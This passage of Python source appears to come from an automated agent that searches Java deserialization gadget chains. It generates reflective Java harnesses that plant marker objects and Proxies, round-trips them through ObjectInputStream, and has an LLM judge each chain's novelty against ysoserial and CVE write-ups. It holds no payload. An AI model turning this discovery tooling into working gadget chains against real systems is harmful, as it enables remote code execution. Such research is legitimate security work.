            print(f"    -> {audit.get('verdict')} tier={audit.get('tier')} "
                  f"novel={audit.get('novel')} {(audit.get('reason') or '')[:90]}")
            self.state["evidence"].append({
                "bridge": p["bridge"], "receiver": p["receiver"],
                "result": {"verdict": p["verdict"], "tax": p.get("tax"),
                           "hop2": True, "reclassified": True},
                "ds_audit": audit, "ts": time.strftime("%FT%T")})
            audited += 1
        self.save()
        self.db.add([{"id": f"chain:recl:{e['bridge']}:{e['receiver']}",
                      "type": "complete_chain_evidence",
                      "tags": ["chain_depth2", "reclassified",
                               str((e.get("ds_audit") or {}).get("tier", "none"))],
                      "payload": e} for e in self.state.get("evidence", [])
                     if e.get("result", {}).get("reclassified")])
        print(f"[reclassify] ds 审计 {audited} 条, evidence 总数 "
              f"{len(self.state.get('evidence', []))}")
        return fixed

    def reflect_with_ds(self) -> dict:
        """与 ds 联合反思 — 全部失败分类 + hop2 发现 + 盲区质询。"""
        results = self.state.get("pair_results", [])
        from collections import Counter
        tax = dict(Counter((p.get("tax") or "?").split(":")[0] for p in results))
        hop2_pairs = [{"bridge": p["bridge"], "receiver": p["receiver"]}
                      for p in results if p.get("hop2")]
        prompt = (
            "你是 JGD 的联合反思审计员。挖掘 agent 的历史:  曾把"
            "『异常栈帧证据』错当『必要条件』, 导致 18 对 hop2 触发被误判 NOT_FIRED"
            "(链完整走通时无异常无栈帧)。该回归已修正(hop2 可达性论证:\n"
            "标记物唯一可达路径=BAVE→桥→接收者→字段)。\n"
            "请联合反思: 1) 该可达性论证是否有漏洞(写侧触发已用模板清除, 还有别的?)\n"
            "2) 失败分类分布说明什么 3) hop2 对里最可能藏真链的是哪个, 为什么\n"
            "4) 还有哪些盲区会让真链继续漏掉 5) 下一步最优先动作。\n"
            "输出 JSON: {\"reachability_sound\": true/false, "
            "\"reachability_holes\": [\"...\"], \"taxonomy_reading\": \"...\", "
            "\"most_promising\": \"bridge→receiver\", \"blind_spots\": [\"...\"], "
            "\"next_actions\": [\"...\"]}\n\n"
            + json.dumps({"tax": tax, "hop2_pairs": hop2_pairs,
                          "hop1_pairs": [{"bridge": p["bridge"],
                                          "receiver": p["receiver"]}
                                         for p in results if p.get("hop1")]},
                         ensure_ascii=False, indent=1))
        resp = llm.ask("ds", "你是严谨的反序列化研究反思员, 直言不讳。",
                       prompt, temperature=0.2, max_tokens=1200)
        parsed = llm.extract_json(resp.get("content") or "")
        out = parsed if isinstance(parsed, dict) else {"parse_fail": True}
        out["raw"] = (resp.get("content") or "")[:1500]
        (scope.DATA / "ds_reflection.json").write_text(
            json.dumps(out, ensure_ascii=False, indent=1), encoding="utf-8")
        print("[ds-reflection] ->", json.dumps(
            {k: out.get(k) for k in ("reachability_sound",
                                     "most_promising")}, ensure_ascii=False))
        return out

    def audit_fires(self, cap: int = 400) -> int:
        """补审计 — 批次触发但未及审计的 pair_results(带 dispatch_stack)。"""
        ev_keys = {(e.get("bridge"), e.get("receiver"))
                   for e in self.state.get("evidence", [])}
        todo = [r for r in self.state.get("pair_results", [])
                if r.get("verdict") not in (None, "NOT_FIRED")
                and (r.get("bridge"), r.get("receiver")) not in ev_keys][:cap]
        print(f"[audit-fires] 待补审计 {len(todo)} 条")
        for r in todo:
            audit = self.audit_chain(
                {"cls": r["bridge"], "dispatch": []},
                {"cls": r["receiver"], "method": "?", "dist": r.get("dist", 0)},
                {"verdict": r.get("verdict"), "tax": r.get("tax"),
                 "carrier": (r.get("tax") or "").split("+")[-1],
                 "hop2": r.get("hop2"), "hop1": r.get("hop1"),
                 "dispatch_stack": [x[7:] for x in (r.get("frames_top") or [])
                                    if x.startswith("DSTACK ")][:12],
                 "deser_ex": r.get("deser_ex", ""),
                 "frames_top": r.get("frames_top", [])[:6],
                 "output": "\n".join(r.get("frames_top") or [])[-250:]})
            self.state["evidence"].append({
                "bridge": r["bridge"], "receiver": r["receiver"],
                "result": {"verdict": r.get("verdict"), "tax": r.get("tax"),
                           "hop2": r.get("hop2"),
                           "dispatch_stack": [x[7:] for x in (r.get("frames_top") or [])
                                              if x.startswith("DSTACK ")][:12]},
                "ds_audit": audit, "ts": time.strftime("%FT%T"),
                "backfilled": True})
            print(f"  ds: {r['receiver'].split('/')[-1]:<24} "
                  f"{audit.get('verdict')} tier={audit.get('tier')} "
                  f"novel={audit.get('novel')}", flush=True)
            if len(self.state["evidence"]) % 10 == 0:
                self.save()
        self.save()
        self.db.add([{"id": f"chain:bf:{e['bridge']}:{e['receiver']}",
                      "type": "complete_chain_evidence",
                      "tags": [str((e.get("ds_audit") or {}).get("tier", "none"))],
                      "payload": e} for e in self.state.get("evidence", [])
                     if e.get("backfilled")])
        return len(todo)

    def entry_side_audit(self) -> dict:
        """入口侧新颖性专审 — HashMap+hashCode桥 作为通用入口从未被 ds
        正面评估过(此前只评接收者侧)。"""
        ev = [e for e in self.state.get("evidence", [])
              if "ObjLongPair" in e.get("bridge", "")
              and e.get("result", {}).get("dispatch_stack")]
        stacks = [e["result"]["dispatch_stack"] for e in ev][:3]
        prompt = (
            "你是反序列化链新颖性审计员。此前的审计只评估了接收者侧(ROME=已知范式)。\n"
            "现在请专审【入口侧】: 以 HashMap/HashSet 反序列化重哈希触发 hashCode 为载体,\n"
            "以 '实现 Serializable 且 hashCode/equals/toString 转发 Object 字段方法' 的\n"
            "类(如 org.apache.activemq.artemis.api.core.ObjLongPair, 需 JDK17)作为\n"
            "入口桥的攻击形态 —— 该【入口组合】是否出现在任何公开 gadget 链语料\n"
            "(ysoserial 全家族/GadgetInspector/各类 CVE writeup)中?\n"
            "注意: 判定对象是入口形态(载体×触发方法×桥类型), 不是 ROME 接收者。\n"
            "输出 JSON: {\"entry_novel\": true/false, \"prior_art\": \"...\", "
            "\"tier\": \"T1|T2|T3|none\", \"reason\": \"...\"}\n\n"
            + json.dumps({"dispatch_stacks": stacks,
                          "bridge": "org.apache.activemq.artemis.api.core.ObjLongPair",
                          "bridge_fields": "Object first + long second",
                          "trigger": "hashCode -> first.hashCode()"},
                         ensure_ascii=False, indent=1))
        resp = llm.ask("ds", "你是严谨的反序列化新颖性审计员。",
                       prompt, temperature=0.1, max_tokens=800)
        parsed = llm.extract_json(resp.get("content") or "")
        out = parsed if isinstance(parsed, dict) else {"parse_fail": True}
        out["raw"] = (resp.get("content") or "")[:1200]
        scope.scoped(HERE / "jgd_entry_audit.json").write_text(
            json.dumps(out, ensure_ascii=False, indent=1), encoding="utf-8")
        print("入口侧专审 ->", json.dumps(
            {k: out.get(k) for k in ("entry_novel", "prior_art", "tier",
                                     "reason")}, ensure_ascii=False)[:600])
        return out

    def write_report(self):
        c = self.state.get("coverage", {})
        ev = self.state.get("evidence", [])
        lines = [
            "# JGDChainCompleteAgent 终局报告",
            "",
            f"## 判定: **{self.state.get('verdict')}**",
            "",
            f"- 桥: {c.get('bridges')}",
            f"- 覆盖总计: {json.dumps(c.get('totals', {}), ensure_ascii=False)}",
            f"- 空池桥(显式穷尽): {len(c.get('empty_pool_bridges', []))} 个",
            f"- 每桥明细: {json.dumps(dict(list((c.get('per_bridge') or {}).items())[:8]), ensure_ascii=False)}",
            f"- 触发证据: {len(ev)} 条",
            "",
        ]
        for e in ev:
            lines.append(f"### {e['bridge']} → {e['receiver']}")
            lines.append(f"- run: {e['result']['verdict']} "
                         f"hop1={e['result'].get('hop1')} hop2={e['result'].get('hop2')}")
            lines.append(f"- ds: {e['ds_audit'].get('verdict')} "
                         f"tier={e['ds_audit'].get('tier')} "
                         f"novel={e['ds_audit'].get('novel')}")
            lines.append(f"- reason: {(e['ds_audit'].get('reason') or '')[:300]}")
            lines.append("")
        REPORT.write_text("\n".join(lines), encoding="utf-8")
        print(f"report -> {REPORT.name}")


MARKER2 = """import java.io.*;
import java.lang.reflect.*;

public class MV{n} implements Serializable, InvocationHandler {{
    // (ds: 可观测分派栈): 标记物记录自身调用者栈 —— 直接证据
    // "桥.方法 → 接收者.方法 → 标记物", 不依赖异常
    static void mark() {{ try {{
        StackTraceElement[] st = new Throwable().getStackTrace();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < st.length && i < 24; i++)
            sb.append(st[i].getClassName()).append('.')
              .append(st[i].getMethodName()).append('\\n');
        java.nio.file.Files.write(
            java.nio.file.Paths.get(System.getProperty("jgd.mark")),
            sb.toString().getBytes());
    }} catch (Exception e) {{}} }}
    public String toString() {{ mark(); return "M"; }}
    public int hashCode() {{ mark(); return 1; }}
    public boolean equals(Object o) {{ mark(); return this == o; }}
    public Object invoke(Object p, Method m, Object[] a) {{
        mark();
        Class<?> rt = m.getReturnType();
        if (rt == boolean.class) return Boolean.FALSE;
        if (rt == int.class) return Integer.valueOf(0);
        if (rt == long.class) return Long.valueOf(0L);
        return null;
    }}
}}
"""

CHAIN2 = """import java.io.*;
import java.lang.reflect.*;

public class CC{n} {{
    public static void main(String[] args) {{
        try {{
            Class<?> bc = Class.forName("{bcls}");
            Class<?> rc = Class.forName("{rcls}");
            Object bridge = mk(bc);
            Object recv = mk(rc);
            if (bridge == null || recv == null) {{
                System.out.println("RES=INST_FAIL"); return; }}

            // hop2 弹药: 接收者的可注入字段填标记对象/Proxy + String 字段填 canary 值
            // (ds: 值可达性): sink 路径需要参数值(JNDI URL/表达式/路径) —
            // 标记对象不带值, String canary 让参数流可观测(异常消息回显)
            int inj2 = 0;
            for (Field f : rc.getDeclaredFields()) {{
                if (Modifier.isStatic(f.getModifiers()) ||
                    Modifier.isTransient(f.getModifiers())) continue;
                Class<?> ft = f.getType();
                Object v;
                if (ft == Object.class) v = new MV{n}();
                else if (ft == String.class) v = "JGDCANARY{n}";
                else if (ft.isInterface() || Modifier.isAbstract(ft.getModifiers())) {{
                    try {{ v = Proxy.newProxyInstance(
                        ft.getClassLoader(), new Class[]{{ft}}, new MV{n}()); }}
                    catch (Throwable t) {{ continue; }}
                }} else continue;
                try {{ f.setAccessible(true); f.set(recv, v); inj2++; }}
                catch (Throwable ig) {{}}
            }}

            // hop1: 把接收者塞进每个能装下它的桥字段(Object/接口/isInstance 可通过)
            int inj1 = 0;
            for (Field f : bc.getDeclaredFields()) {{
                if (Modifier.isStatic(f.getModifiers()) ||
                    Modifier.isTransient(f.getModifiers())) continue;
                Class<?> ft = f.getType();
                boolean fits = (ft == Object.class) || ft.isInstance(recv)
                    || (ft.isInterface() && ft.isAssignableFrom(rc));
                if (!fits) continue;
                try {{
                    f.setAccessible(true); f.set(bridge, recv); inj1++;
                }} catch (Throwable ig) {{}}
            }}
            System.out.println("INJ hop1=" + inj1 + " hop2=" + inj2);

            {carrier}

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            new ObjectOutputStream(bos).writeObject(b);
            System.out.println("RES=SER_OK");
            // 清掉写侧(writeObject 钩子)可能触发的标记 —— 只认读侧
            try {{ java.nio.file.Files.deleteIfExists(
                java.nio.file.Paths.get("/tmp/jgdcc_{n}_hop2")); }}
            catch (Exception e) {{}}
            try {{
                new ObjectInputStream(
                    new ByteArrayInputStream(bos.toByteArray())).readObject();
                System.out.println("RES=DESER_COMPLETE");
            }} catch (Throwable t) {{
                System.out.println("RES=DESER_EX:" + t.getClass().getName()
                    + ": " + t.getMessage());
                for (StackTraceElement f : t.getStackTrace()) {{
                    System.out.println("FRAME " + f.getClassName()
                        + "." + f.getMethodName() + " line=" + f.getLineNumber());
                }}
                Throwable c = t.getCause();
                int depth = 0;
                while (c != null && depth++ < 8) {{
                    System.out.println("RES=CAUSE:" + c.getClass().getName());
                    for (StackTraceElement f : c.getStackTrace()) {{
                        System.out.println("FRAME " + f.getClassName()
                            + "." + f.getMethodName() + " line="
                            + f.getLineNumber());
                    }}
                    c = c.getCause();
                }}
            }}
            System.out.println("RES=DONE");
        }} catch (Throwable t) {{
            System.out.println("RES=ERROR:" + t);
        }}
    }}
    static Object mk(Class<?> c) {{
        try {{ return c.getDeclaredConstructor().newInstance(); }}
        catch (Throwable t) {{
            try {{
                Constructor<?> ctor = sun.reflect.ReflectionFactory
                    .getReflectionFactory()
                    .newConstructorForSerialization(c,
                        Object.class.getDeclaredConstructor());
                ctor.setAccessible(true); return ctor.newInstance();
            }} catch (Throwable t2) {{ return null; }}
        }}
    }}
}}
"""


if __name__ == "__main__":
    if "--reclassify" in sys.argv:
        raise SystemExit(JGDChainCompleteAgent().reclassify())
    if "--reflect" in sys.argv:
        raise SystemExit(JGDChainCompleteAgent().reflect_with_ds())
    if "--entry-audit" in sys.argv:
        raise SystemExit(JGDChainCompleteAgent().entry_side_audit())
    if "--audit-fires" in sys.argv:
        raise SystemExit(JGDChainCompleteAgent().audit_fires())
    mp = 200
    for i, a in enumerate(sys.argv):
        if a == "--max-pairs" and i + 1 < len(sys.argv):
            mp = int(sys.argv[i + 1])
    raise SystemExit(JGDChainCompleteAgent().run(max_pairs=mp))
